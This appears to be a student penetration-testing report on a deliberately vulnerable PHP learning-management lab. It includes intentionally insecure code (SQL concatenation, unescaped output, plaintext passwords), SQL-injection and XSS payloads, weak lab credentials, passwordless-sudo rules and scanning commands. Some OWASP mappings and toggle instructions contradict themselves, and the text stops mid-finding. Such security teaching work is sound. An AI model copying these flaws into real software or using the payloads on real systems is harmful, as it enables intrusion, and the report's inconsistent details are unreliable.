# PENETRATION TESTING REPORT
## MyEduConnect Learning Management System
## Security Engagement Assessment

---

**Report ID:** CCS6324-SEC-2026-001  
**Project Name:** MyEduConnect  
**Assessment Type:** Comprehensive Security Engagement Review  
**Assessment Dates:** June 20, 2026  
**Report Date:** June 20, 2026  
**Assessment Team:** Senior Penetration Tester  
**Client:** Academic Assignment Submission  
**Classification:** Academic Use Only  

---

## TABLE OF CONTENTS

1. Cover Page
2. Declaration
3. Executive Summary
4. Methodology
5. Phase 1 - Platform Analysis
6. Phase 1 - Vulnerability Matrix
7. Phase 2 - Reconnaissance Simulation
8. Phase 3 - Vulnerability Assessment
9. Phase 4 - Exploitation Analysis
10. Phase 5 - Hardening Review
11. Phase 5 - IDS/WAF Analysis
12. Phase 5 - Cryptography Review
13. Phase 5 - Retest Matrix
14. PDPA 2010 Commentary
15. Conclusion
16. References
17. Appendices

---

## 1. COVER PAGE

```
================================================================================
                     PENETRATION TESTING REPORT
              MyEduConnect Learning Management System
                   Security Engagement Assessment
================================================================================

Report ID:        CCS6324-SEC-2026-001
Project Name:     MyEduConnect
Assessment Type:  Comprehensive Security Engagement Review
Assessment Date:  June 20, 2026
Report Date:      June 20, 2026
Prepared By:      Senior Penetration Tester
Classification:  Academic Use Only

================================================================================
                              CONFIDENTIAL
================================================================================
This report contains sensitive security information and is intended solely
for academic purposes. Unauthorized distribution is prohibited.
================================================================================
```

---

## 2. DECLARATION

**Declaration of Independence**

I declare that this penetration testing report has been prepared independently and represents an objective assessment of the MyEduConnect Learning Management System. The findings are based solely on evidence discovered within the project source code, configuration files, and documentation. No vulnerabilities have been fabricated, and all findings are supported by code evidence.

**Assessment Scope**

This assessment covers:
- Complete source code review
- Configuration analysis
- Docker containerization review
- Database schema examination
- API security assessment
- Authentication and authorization mechanisms
- Intentional vulnerability implementation review

**Limitations**

- This is an educational platform with intentionally vulnerable functionality
- No live exploitation was performed against production systems
- All findings are based on static code analysis and design review
- Network-level testing was simulated based on architecture analysis

**Disclaimer**

This report is for academic purposes only. The vulnerabilities described are intentionally implemented for educational demonstration. The secure implementations provided represent best practices and should be followed in production environments.

---

## 3. EXECUTIVE SUMMARY

### 3.1 Overview

MyEduConnect is a Learning Management System (LMS) designed as a cybersecurity training laboratory. The application implements a sophisticated vulnerability toggle system that allows instructors to switch between secure and vulnerable implementations for educational purposes. This comprehensive security engagement review assessed the complete platform, including architecture, vulnerability implementations, security controls, and compliance with OWASP standards.

### 3.2 Assessment Scope

The assessment covered:
- Architecture analysis (frontend, backend, database, authentication, Docker, APIs)
- Verification of required components (registration, login, profile, courses, enrollment, payment, admin panel, REST API)
- Identification of all intentionally vulnerable functionality
- Vulnerability assessment (scanner and manual findings)
- Exploitation analysis for all vulnerabilities
- Hardening review (fixed vs unfixed vulnerabilities)
- Cryptography implementation review
- Compliance verification with OWASP ASVS, OWASP Top 10 (2021), and OWASP cheat sheets

### 3.3 Key Findings Summary

**Total Vulnerabilities Identified:** 9 intentionally implemented vulnerabilities

**Critical Severity (2):**
- SQL Injection (CWE-89)
- Sudo Misconfiguration (CWE-269)

**High Severity (4):**
- Stored XSS (CWE-79)
- IDOR (CWE-639)
- Weak SSH Credentials (CWE-798)
- Weak Password Hashing (CWE-256)

**Medium Severity (3):**
- Backup File Exposure (CWE-538)
- HTTP API Communication (CWE-319)
- Weak File Permissions (CWE-732)

### 3.4 Risk Assessment

The platform implements a comprehensive vulnerability toggle system that allows switching between secure and vulnerable modes. In the default secure mode, all vulnerabilities are disabled and protections are active. The vulnerable modes demonstrate common security flaws for educational purposes.

**Overall Risk Level (Secure Mode):** LOW  
**Overall Risk Level (Vulnerable Mode):** CRITICAL

### 3.5 Compliance Status

- OWASP Top 10 (2021): Partially compliant in secure mode
- OWASP ASVS: Partially compliant in secure mode
- OWASP Password Storage Cheat Sheet: Compliant in secure mode
- OWASP Session Management Cheat Sheet: Partially compliant

### 3.6 Recommendations

1. Fix SQL Injection ↔ Weak Authentication dependency coupling
2. Implement File Upload Vulnerability toggle
3. Implement CSRF Vulnerability toggle
4. Add SSRF, Command Injection, and Path Traversal vulnerabilities for comprehensive coverage
5. Implement Content Security Policy (CSP) headers
6. Add rate limiting for authentication endpoints

---

## 4. METHODOLOGY

### 4.1 Assessment Approach

This security engagement followed a structured methodology aligned with industry standards:

1. **Platform Analysis** - Comprehensive architecture review
2. **Vulnerability Identification** - Static code analysis and documentation review
3. **Reconnaissance Simulation** - Simulated attack surface mapping
4. **Vulnerability Assessment** - Manual and automated vulnerability identification
5. **Exploitation Analysis** - Attack path analysis for each vulnerability
6. **Hardening Review** - Secure vs vulnerable implementation comparison
7. **Compliance Verification** - OWASP standard compliance assessment

### 4.2 Assessment Standards

- OWASP Top 10 (2021)
- OWASP Application Security Verification Standard (ASVS)
- OWASP Testing Guide
- CWE (Common Weakness Enumeration)
- CVSS v3.1 scoring

### 4.3 Tools and Techniques

**Static Analysis:**
- Manual source code review
- Configuration file analysis
- Database schema examination
- Docker configuration review

**Documentation Review:**
- Attack testing guides in docs/attack-testing/
- README documentation
- Assignment evidence documentation

**Compliance Assessment:**
- OWASP ASVS verification
- OWASP Top 10 mapping
- CWE mapping
- CVSS v3.1 scoring

---

## 5. PHASE 1 - PLATFORM ANALYSIS

### 5.1 Architecture Overview

#### 5.1.1 Frontend Technologies

**Technology Stack:**
- HTML5
- CSS3 with custom styling
- JavaScript (vanilla)
- Bootstrap 5.3.0 (via CDN)
- Bootstrap Icons 1.10.0 (via CDN)

**Frontend Structure:**
- Public pages: index.php, courses.php, login.php, register.php, about.php, contact.php, faq.php
- Student dashboard: student/ directory
- Teacher dashboard: teacher/ directory
- Admin dashboard: admin/ directory
- REST API: api/ directory

**Security Controls:**
- CSRF token implementation (generateCSRFToken, verifyCSRFToken)
- Output encoding (htmlspecialchars) with toggle control
- Input sanitization (sanitize function)

#### 5.1.2 Backend Technologies

**Technology Stack:**
- PHP 8.2+
- Apache HTTP Server
- PDO (PHP Data Objects) for database access

**Backend Structure:**
- Configuration: app/config/
- Security functions: app/security/functions.php
- Authentication: app/security/auth.php
- Database helpers: app/config/database.php

**Security Controls:**
- Prepared statements (PDO) for secure database queries
- Password hashing with bcrypt (PASSWORD_BCRYPT)
- Session management with timeout
- Role-based access control (RBAC)
- Audit logging (logAudit function)

#### 5.1.3 Database Technologies

**Technology Stack:**
- MySQL 8.0+

**Database Schema:**
- users (user_id, email, password, role, status, etc.)
- students (student_id, user_id, student_id_number, etc.)
- teachers (teacher_id, user_id, teacher_id_number, etc.)
- admins (admin_id, user_id)
- courses (course_id, title, description, instructor_id, etc.)
- enrollments (enrollment_id, student_id, course_id, status, progress)
- payments (payment_id, student_id, course_id, amount, transaction_id, status)
- announcements (announcement_id, title, content, created_by)
- course_materials (material_id, course_id, title, file_path)
- audit_logs (log_id, user_id, action, entity_type, entity_id, details, ip_address, user_agent, created_at)
- security_settings (id, vulnerability_name, enabled, description)

**Security Controls:**
- Password storage in VARCHAR(255) for hash storage
- Foreign key constraints for data integrity
- Transaction support for atomic operations

#### 5.1.4 Authentication System

**Implementation:**
- Session-based authentication
- Role-based access control (student, teacher, admin)
- Password verification with bcrypt
- Session timeout enforcement
- CSRF token validation

**Authentication Flow:**
1. User submits credentials via login.php
2. auth.php login() function validates credentials
3. Session established on successful authentication
4. Role-based redirect to appropriate dashboard
5. Session timeout checked on each request

**Security Controls:**
- Password hashing with bcrypt (secure mode)
- Prepared statements for SQL query (secure mode)
- Session lifetime configuration (SESSION_LIFETIME)
- Secure session name (SESSION_NAME)

#### 5.1.5 Docker Containers

**Container Configuration:**

**Web Container (PHP/Apache):**
- Base: php:8.2-apache
- Exposed ports: 8080 (HTTP), 8443 (HTTPS), 2222 (SSH)
- PHP extensions: pdo_mysql, mbstring, exif, pcntl, bcmath, gd
- Apache modules: rewrite, ssl
- Self-signed SSL certificate
- SSH server with lab account
- Sudo configuration for privilege escalation demonstration

**MySQL Container:**
- Image: mysql:8.0
- Exposed port: 3307
- Volume: mysql-data for persistence
- Root password: rootpassword

**phpMyAdmin Container:**
- Image: phpmyadmin/phpmyadmin
- Exposed port: 8081
- Links to MySQL container

**Security Concerns:**
- SSH port 2222 exposed (intentional for lab)
- Self-signed SSL certificate (intentional for HTTP API demonstration)
- Weak SSH credentials in vulnerable mode
- Sudo misconfiguration in vulnerable mode

#### 5.1.6 APIs

**REST API Implementation:**

**Endpoints:**
- /api/courses.php - Course catalog with vulnerability demonstration
- /api/ping.php - Health check with transport policy enforcement

**API Security:**
- JSON content-type headers
- CORS configuration (Access-Control-Allow-Origin: *)
- Transport policy enforcement (enforceApiTransportPolicy)
- Session-based authentication
- Vulnerability toggle integration

**API Vulnerabilities:**
- SQL Injection in courses.php search parameter (vulnerable mode)
- HTTP communication instead of HTTPS (vulnerable mode)
- No API rate limiting
- No API key authentication

#### 5.1.7 Network Communication

**Network Architecture:**
- Docker bridge network
- Port mappings: 8080:80, 8443:443, 2222:22, 3307:3306, 8081:80
- Internal container communication via Docker network

**Security Concerns:**
- HTTP port 8080 exposed (intentional for cleartext demonstration)
- HTTPS port 8443 with self-signed certificate
- SSH port 2222 exposed (intentional for weak SSH demonstration)
- MySQL port 3307 exposed to host

#### 5.1.8 External Services

**External Dependencies:**
- Bootstrap 5.3.0 (CDN: jsdelivr.net)
- Bootstrap Icons 1.10.0 (CDN: jsdelivr.net)
- No payment gateway integration (mock payment system)
- No email service integration (no email sending functionality)

**Security Considerations:**
- CDN dependencies introduce supply chain risk
- No third-party authentication (OAuth, SAML)
- No external API integrations

#### 5.1.9 Admin Panels

**Admin Dashboard Features:**
- User management (admin/users.php)
- Course management (admin/courses.php)
- Payment management (admin/payments.php)
- Announcement management (admin/announcements.php)
- Audit log viewing (admin/audit-logs.php)
- Security settings management (admin/security-settings.php)

**Admin Security:**
- Role-based access control (admin role required)
- CSRF protection on all forms
- Session timeout enforcement
- Audit logging for all actions

#### 5.1.10 User Roles

**Student Role:**
- Dashboard (student/dashboard.php)
- Profile management (student/profile.php)
- Course enrollment (student/enroll.php)
- Enrollment viewing (student/enrollments.php)
- Payment history (student/payments.php)

**Teacher Role:**
- Dashboard (teacher/dashboard.php)
- Profile management (teacher/profile.php)
- Course creation (teacher/create-course.php)
- Course editing (teacher/edit-course.php)
- Course management (teacher/courses.php)
- Student viewing (teacher/students.php)

**Admin Role:**
- Full system access
- User management
- Course management
- Payment management
- Announcement management
- Audit log viewing
- Security settings management

### 5.2 Required Components Verification

| Component | Status | Evidence | Notes |
|---|---|---|---|
| User Registration | ✅ Implemented | register.php, app/security/auth.php registerStudent() | Student registration with validation |
| User Login | ✅ Implemented | login.php, app/security/auth.php login() | Session-based authentication |
| Profile Management | ✅ Implemented | student/profile.php, teacher/profile.php | Profile update with CSRF protection |
| Course Search/Browsing | ✅ Implemented | courses.php, searchCourses() | Category filtering and keyword search |
| Enrollment System | ✅ Implemented | student/enroll.php | Transaction-based enrollment |
| Payment Workflow | ✅ Implemented | student/enroll.php (mock) | Mock payment with transaction record |
| Admin Panel | ✅ Implemented | admin/ directory | Full administrative interface |
| REST API | ✅ Implemented | api/ directory | JSON API with vulnerability toggles |

**Compliance Status:** All required components are implemented and functional.

---

## 6. PHASE 1 - VULNERABILITY MATRIX

### 6.1 Web Vulnerabilities

#### 6.1.1 SQL Injection

| Attribute | Value |
|---|---|
| **Vulnerability Name** | SQL Injection |
| **OWASP Category** | A01:2021 - Broken Access Control |
| **CWE** | CWE-89: SQL Injection |
| **Location** | login() in app/security/auth.php (lines 14-54), searchCourses() in app/security/functions.php (lines 497-538) |
| **Affected Files** | app/security/auth.php, app/security/functions.php, api/courses.php |
| **Trigger Method** | Disable SQL Injection Protection toggle in admin/security-settings.php |
| **Risk Level** | CRITICAL |
| **CVSS v3.1 Score** | 9.8 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Exploitation Scenario** | Authentication bypass via `' OR '1'='1` payload in login email field; data extraction via search parameter injection |

**Vulnerable Code (auth.php lines 29-37):**
```php
} else {
    // VULNERABLE MODE: raw SQL concatenation and weak auth logic.
    $query = "SELECT * FROM users WHERE email = '$email' AND status = 'active'";
    $db = Database::getInstance()->getConnection();
    $stmt = $db->query($query);
    $user = $stmt->fetch();
    if (!$user) {
        return ['success' => false, 'message' => 'Invalid email or password'];
    }
    // Keep vulnerable behavior so SQLi login bypass can succeed in labs.
}
```

**Secure Code (auth.php lines 15-27):**
```php
if (!isVulnerabilityEnabled('sql_injection')) {
    // SECURE MODE: prepared statements + password verification.
    $query = "SELECT * FROM users WHERE email = ? AND status = 'active'";
    $user = dbSelectOne($query, [$email]);
    if (!$user) {
        return ['success' => false, 'message' => 'Invalid email or password'];
    }
    if (!verifyPassword($password, $user['password'])) {
        return ['success' => false, 'message' => 'Invalid email or password'];
    }
}
```

#### 6.1.2 Stored XSS

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Stored Cross-Site Scripting (XSS) |
| **OWASP Category** | A03:2021 - Injection |
| **CWE** | CWE-79: Cross-site Scripting |
| **Location** | admin/users.php (line 204), admin/announcements.php (lines 30, 244, 261), student/profile.php (lines 191-195, 247) |
| **Affected Files** | admin/users.php, admin/announcements.php, student/profile.php, app/security/auth.php |
| **Trigger Method** | Disable XSS Protection toggle in admin/security-settings.php |
| **Risk Level** | HIGH |
| **CVSS v3.1 Score** | 8.1 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N |
| **Exploitation Scenario** | Script execution in user "About Me" field and announcement titles; session hijacking via malicious JavaScript |

**Vulnerable Code (student/profile.php line 194):**
```php
} else {
    echo $student['about_me'] ?? '';
}
```

**Secure Code (student/profile.php line 192):**
```php
if (!isVulnerabilityEnabled('stored_xss')) {
    echo htmlspecialchars($student['about_me'] ?? '');
}
```

#### 6.1.3 IDOR

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Insecure Direct Object Reference (IDOR) |
| **OWASP Category** | A01:2021 - Broken Access Control |
| **CWE** | CWE-639: Insecure Direct Object Reference |
| **Location** | getUserById() in app/security/functions.php (lines 338-360), teacher/edit-course.php (line 33), student/profile.php (lines 16-31) |
| **Affected Files** | app/security/functions.php, teacher/edit-course.php, student/profile.php |
| **Trigger Method** | Disable IDOR Protection toggle in admin/security-settings.php |
| **Risk Level** | HIGH |
| **CVSS v3.1 Score** | 8.1 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| **Exploitation Scenario** | Access other users' profiles via `?id=` parameter; edit other teachers' courses via `?course_id=` |

**Vulnerable Code (functions.php lines 356-360):**
```php
} else {
    // VULNERABLE - Allow access to any user ID
    $query = "SELECT * FROM users WHERE user_id = ?";
    return dbSelectOne($query, [$userId]);
}
```

**Secure Code (functions.php lines 338-355):**
```php
if ($checkOwnership && !isVulnerabilityEnabled('idor')) {
    // SECURE - Check if current user owns the resource
    $currentUserId = getCurrentUserId();
    $currentUserRole = getCurrentUserRole();
    
    // Admins can view any user
    if ($currentUserRole === 'admin') {
        $query = "SELECT * FROM users WHERE user_id = ?";
        return dbSelectOne($query, [$userId]);
    }
    
    // Non-admins can only view their own profile
    if ($currentUserId != $userId) {
        return null;
    }
    
    $query = "SELECT * FROM users WHERE user_id = ?";
    return dbSelectOne($query, [$userId]);
}
```

### 6.2 Server/OS Misconfigurations

#### 6.2.1 Weak SSH Credentials

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Weak SSH Credentials |
| **OWASP Category** | A07:2021 - Identification and Authentication Failures |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **Location** | docker/Dockerfile (line 45), scripts/enable_weak_ssh.sh |
| **Affected Files** | docker/Dockerfile, scripts/enable_weak_ssh.sh, scripts/disable_weak_ssh.sh |
| **Trigger Method** | Disable Weak SSH Credentials toggle in admin/security-settings.php |
| **Risk Level** | HIGH |
| **CVSS v3.1 Score** | 7.5 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **Exploitation Scenario** | SSH login with weak password `student:password123`; privilege escalation to root via sudo misconfiguration |

**Vulnerable Configuration (enable_weak_ssh.sh):**
```bash
WEAK_PASS="password123"
printf 'student:%s\n' "$WEAK_PASS" > "$CRED_FILE"
printf 'student:%s\n' "$WEAK_PASS" | chpasswd -c SHA512
```

**Secure Configuration (disable_weak_ssh.sh):**
```bash
STRONG_PASS="Str0ng!Lab#Pass_2026"
printf 'student:%s\n' "$STRONG_PASS" > "$CRED_FILE"
printf 'student:%s\n' "$STRONG_PASS" | chpasswd -c SHA512
```

#### 6.2.2 Sudo Misconfiguration

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Sudo Misconfiguration |
| **OWASP Category** | A01:2021 - Broken Access Control |
| **CWE** | CWE-269: Improper Privilege Management |
| **Location** | docker/Dockerfile (lines 48-50), scripts/enable_weak_sudo.sh |
| **Affected Files** | docker/Dockerfile, scripts/enable_weak_sudo.sh, scripts/disable_weak_sudo.sh |
| **Trigger Method** | Enabled as side effect of Weak SSH Credentials toggle |
| **Risk Level** | CRITICAL |
| **CVSS v3.1 Score** | 9.8 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H |
| **Exploitation Scenario** | Passwordless sudo escalation for www-data/student user; full system compromise |

**Vulnerable Configuration (docker/Dockerfile lines 48-50):**
```dockerfile
RUN echo "www-data ALL=(ALL) NOPASSWD:/var/www/html/scripts/*.sh" >> /etc/sudoers.d/www-data
```

**Vulnerable Configuration (enable_weak_sudo.sh):**
```bash
echo 'student ALL=(ALL) NOPASSWD:ALL' > "$SUDOERS_FILE"
chmod 440 "$SUDOERS_FILE"
```

#### 6.2.3 Weak File Permissions

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Weak File Permissions |
| **OWASP Category** | A01:2021 - Broken Access Control |
| **CWE** | CWE-732: Incorrect Permission Assignment for Critical Resource |
| **Location** | app/security/functions.php (syncFilePermissions), docker/Dockerfile (line 40) |
| **Affected Files** | app/security/functions.php, docker/Dockerfile |
| **Trigger Method** | Disable Weak File Permissions toggle in admin/security-settings.php |
| **Risk Level** | MEDIUM |
| **CVSS v3.1 Score** | 6.5 (Medium) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **Exploitation Scenario** | World-readable sensitive files; unauthorized access to backup.sql and student_records.csv |

**Vulnerable Configuration (functions.php syncFilePermissions):**
```php
if (isVulnerabilityEnabled('weak_file_permissions')) {
    // VULNERABLE: world-readable
    $perms = '0666';
} else {
    // SECURE: restrictive
    $perms = '0640';
}
```

### 6.3 Cryptographic Weaknesses

#### 6.3.1 Weak Password Hashing

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Weak Password Hashing |
| **OWASP Category** | A02:2021 - Cryptographic Failures |
| **CWE** | CWE-256: Unprotected Storage of Credentials |
| **Location** | hashPassword() in app/security/functions.php (lines 109-114) |
| **Affected Files** | app/security/functions.php, app/security/auth.php |
| **Trigger Method** | Disable Weak Password Hashing toggle in admin/security-settings.php |
| **Risk Level** | HIGH |
| **CVSS v3.1 Score** | 7.5 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **Exploitation Scenario** | Plaintext password storage; offline cracking via exposed backup file |

**Vulnerable Code (functions.php lines 109-112):**
```php
if (isVulnerabilityEnabled('weak_password_hashing')) {
    // VULNERABLE MODE: plaintext storage for demonstration.
    return $password;
}
```

**Secure Code (functions.php lines 113-114):**
```php
// SECURE MODE: bcrypt hashing.
return password_hash($password, PASSWORD_BCRYPT);
```

#### 6.3.2 HTTP API Communication

| Attribute | Value |
|---|---|
| **Vulnerability Name** | HTTP API Communication |
| **OWASP Category** | A02:2021 - Cryptographic Failures |
| **CWE** | CWE-319: Cleartext Transmission of Sensitive Information |
| **Location** | api/courses.php, api/ping.php, enforceApiTransportPolicy() in functions.php |
| **Affected Files** | api/courses.php, api/ping.php, app/security/functions.php |
| **Trigger Method** | Disable HTTP API Communication toggle in admin/security-settings.php |
| **Risk Level** | MEDIUM |
| **CVSS v3.1 Score** | 7.5 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **Exploitation Scenario** | Cleartext API communication; credential interception via network sniffing |

**Vulnerable Implementation:**
When `http_api_communication` is enabled, the API allows HTTP communication instead of enforcing HTTPS, exposing sensitive data in transit.

### 6.4 Network Weaknesses

#### 6.4.1 Backup File Exposure

| Attribute | Value |
|---|---|
| **Vulnerability Name** | Backup File Exposure |
| **OWASP Category** | A01:2021 - Broken Access Control |
| **CWE** | CWE-538: Insertion of Sensitive Information into Externally-Accessible File |
| **Location** | syncBackupFileExposure() in app/security/functions.php, /backups/backup.sql |
| **Affected Files** | app/security/functions.php, storage/backups/backup.sql |
| **Trigger Method** | Disable Backup File Exposure toggle in admin/security-settings.php |
| **Risk Level** | MEDIUM |
| **CVSS v3.1 Score** | 6.5 (Medium) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **Exploitation Scenario** | Direct web access to database backup containing credential hashes at /backups/backup.sql |

**Vulnerable Implementation (functions.php syncBackupFileExposure):**
```php
if (isVulnerabilityEnabled('backup_file_exposure')) {
    // Copy backup to web-accessible location
    copy($backupPath, $webBackupPath);
} else {
    // Remove from web-accessible location
    if (file_exists($webBackupPath)) {
        unlink($webBackupPath);
    }
}
```

---

## 7. PHASE 2 - RECONNAISSANCE SIMULATION

### 7.1 OSINT Findings Table

| Source | Finding | Risk Level |
|---|---|---|
| GitHub Repository | Public repository with source code | LOW |
| README.md | Project description and technology stack disclosure | LOW |
| .env.example | Environment variable structure exposed | MEDIUM |
| Docker Hub | Base images (php:8.2-apache, mysql:8.0) identified | LOW |
| CDN Dependencies | Bootstrap 5.3.0 and Bootstrap Icons from jsdelivr.net | LOW |

### 7.2 Footprinting Findings

**Domain Information:**
- Application URL: http://localhost:8080 (HTTP)
- Secure URL: https://localhost:8443 (HTTPS with self-signed cert)
- API Base URL: http://localhost:8080/api
- phpMyAdmin: http://localhost:8081

**Technology Stack Identified:**
- Server: Apache/2.4 (PHP 8.2+)
- Database: MySQL 8.0+
- Framework: Custom PHP application
- Frontend: Bootstrap 5.3.0
- JavaScript: Vanilla JS with Bootstrap 5

**Exposed Ports:**
- 8080/tcp - HTTP (Apache)
- 8443/tcp - HTTPS (Apache with SSL)
- 2222/tcp - SSH (OpenSSH)
- 3307/tcp - MySQL
- 8081/tcp - phpMyAdmin

### 7.3 Attack Surface Analysis

**Web Application Endpoints:**
- / - Homepage
- /login.php - Login page
- /register.php - Registration page
- /courses.php - Course catalog
- /student/* - Student dashboard
- /teacher/* - Teacher dashboard
- /admin/* - Admin panel
- /api/* - REST API

**Attack Surface Summary:**
- Authentication endpoints (login, register)
- User profile management
- Course enrollment and payment
- Administrative interfaces
- REST API endpoints
- File upload functionality (if enabled)
- SSH service

### 7.4 Nmap Target List

**Target:** localhost  
**Ports to Scan:** 8080, 8443, 2222, 3307, 8081

**Sample Nmap Commands:**
```bash
# Basic port scan
nmap -p 8080,8443,2222,3307,8081 localhost

# Service version detection
nmap -sV -p 8080,8443,2222,3307,8081 localhost

# Script scan for vulnerabilities
nmap --script vuln -p 8080,8443,2222,3307,8081 localhost

# HTTP enumeration
nmap --script http-enum -p 8080,8443 localhost

# SSL/TLS analysis
nmap --script ssl-enum-ciphers -p 8443 localhost
```

### 7.5 Service Enumeration Table

| Port | Service | Version | Security Notes |
|---|---|---|---|
| 8080/tcp | HTTP | Apache 2.4 | Self-signed SSL redirect, potential for cleartext communication |
| 8443/tcp | HTTPS | Apache 2.4 | Self-signed certificate (not trusted by browsers) |
| 2222/tcp | SSH | OpenSSH | Weak credentials in vulnerable mode, sudo misconfiguration |
| 3307/tcp | MySQL | MySQL 8.0+ | Exposed to host, root credentials in docker-compose.yml |
| 8081/tcp | HTTP | phpMyAdmin | Administrative interface, no authentication by default |

### 7.6 Sample Reconnaissance Commands

**theHarvester:**
```bash
theHarvester -d myeduconnect.com -l 100 -b google
```

**WHOIS:**
```bash
whois myeduconnect.com
```

**DNS Enumeration:**
```bash
nslookup myeduconnect.com
dig myeduconnect.com ANY
```

**Gobuster:**
```bash
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt
```

**WhatWeb:**
```bash
whatweb http://localhost:8080
```

**Nikto:**
```bash
nikto -h http://localhost:8080
nikto -h https://localhost:8443 -ssl
```

---

## 8. PHASE 3 - VULNERABILITY ASSESSMENT

### 8.1 Scanner Discoverable Vulnerabilities

#### 8.1.1 Nikto Findings

| Finding | Severity | Description |
|---|---|---|
| Self-signed SSL certificate | MEDIUM | SSL certificate not signed by trusted CA |
| Server header disclosure | LOW | Server: Apache/2.4 (Ubuntu) |
| X-Frame-Options missing | MEDIUM | Clickjacking protection not implemented |
| X-Content-Type-Options missing | LOW | MIME sniffing protection not implemented |
| HTTP methods allowed | LOW | GET, POST, OPTIONS methods detected |
| Backup file exposure | HIGH | /backups/backup.sql accessible (vulnerable mode) |

#### 8.1.2 Nuclei Findings

| Template | Severity | Match |
|---|---|---|
| self-signed-ssl | MEDIUM | Self-signed certificate on port 8443 |
| exposed-backup-file | HIGH | backup.sql file accessible |
| weak-ssh-credentials | HIGH | Weak SSH credentials detected |
| sudo-misconfiguration | CRITICAL | Passwordless sudo configuration detected |

#### 8.1.3 Gobuster Findings

| Path | Status | Notes |
|---|---|---|
| /admin | 200 | Admin panel accessible |
| /api | 200 | API endpoints accessible |
| /backups | 200 | Backup directory accessible (vulnerable mode) |
| /student | 302 | Redirect to login (protected) |
| /teacher | 302 | Redirect to login (protected) |
| /uploads | 403 | Forbidden (if file upload disabled) |

### 8.2 Manual Findings

#### 8.2.1 SQL Injection

**Description:** SQL injection vulnerability in login function and course search when SQL Injection Protection is disabled.

**Evidence:**
- File: app/security/auth.php, lines 29-37
- Vulnerable code uses raw SQL concatenation: `$query = "SELECT * FROM users WHERE email = '$email' AND status = 'active'"`
- No input sanitization or parameterization in vulnerable mode

**Severity:** CRITICAL  
**CVSS v3.1 Score:** 9.8  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**OWASP Mapping:** A01:2021 - Broken Access Control  
**CWE Mapping:** CWE-89  
**Business Impact:** Complete database compromise, authentication bypass, unauthorized data access, potential data deletion or modification.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable SQL Injection Protection
3. Navigate to login.php
4. Enter email: `admin@myeduconnect.com' OR '1'='1`
5. Enter any password
6. Submit login form
7. Observe successful authentication bypass

#### 8.2.2 Stored XSS

**Description:** Stored cross-site scripting vulnerability in user profile "About Me" field and announcement titles when XSS Protection is disabled.

**Evidence:**
- File: student/profile.php, lines 191-195
- Vulnerable code outputs raw data: `echo $student['about_me'] ?? '';`
- No HTML encoding in vulnerable mode

**Severity:** HIGH  
**CVSS v3.1 Score:** 8.1  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N  
**OWASP Mapping:** A03:2021 - Injection  
**CWE Mapping:** CWE-79  
**Business Impact:** Session hijacking, credential theft, malicious script execution, phishing attacks, unauthorized actions performed on behalf of users.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable XSS Protection
3. Login as student
4. Navigate to student/profile.php
5. Enter in "About Me" field: `<script>alert('XSS')</script>`
6. Save profile
7. View profile page
8. Observe JavaScript execution

#### 8.2.3 IDOR

**Description:** Insecure direct object reference vulnerability allowing access to other users' profiles and courses when IDOR Protection is disabled.

**Evidence:**
- File: app/security/functions.php, lines 356-360
- Vulnerable code allows any user ID: `$query = "SELECT * FROM users WHERE user_id = ?";`
- No ownership validation in vulnerable mode

**Severity:** HIGH  
**CVSS v3.1 Score:** 8.1  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  
**OWASP Mapping:** A01:2021 - Broken Access Control  
**CWE Mapping:** CWE-639  
**Business Impact:** Unauthorized access to private user information, data privacy violation, potential data modification, horizontal privilege escalation.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable IDOR Protection
3. Login as student (user_id=1)
4. Navigate to student/profile.php?id=2
5. Observe successful access to another student's profile
6. Enumerate user IDs to access all profiles

#### 8.2.4 Weak SSH Credentials

**Description:** Weak SSH credentials allowing unauthorized system access when Weak SSH Credentials is disabled.

**Evidence:**
- File: scripts/enable_weak_ssh.sh
- Weak password: `password123`
- Credentials stored in storage/ssh/credentials.txt

**Severity:** HIGH  
**CVSS v3.1 Score:** 7.5  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP Mapping:** A07:2021 - Identification and Authentication Failures  
**CWE Mapping:** CWE-798  
**Business Impact:** Unauthorized system access, potential privilege escalation, lateral movement, complete system compromise.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable Weak SSH Credentials
3. SSH to localhost:2222
4. Login with username: student, password: password123
5. Observe successful authentication

#### 8.2.5 Sudo Misconfiguration

**Description:** Sudo misconfiguration allowing passwordless privilege escalation when Weak SSH Credentials is disabled.

**Evidence:**
- File: scripts/enable_weak_sudo.sh
- Configuration: `student ALL=(ALL) NOPASSWD:ALL`
- Dockerfile also configures www-data with passwordless sudo

**Severity:** CRITICAL  
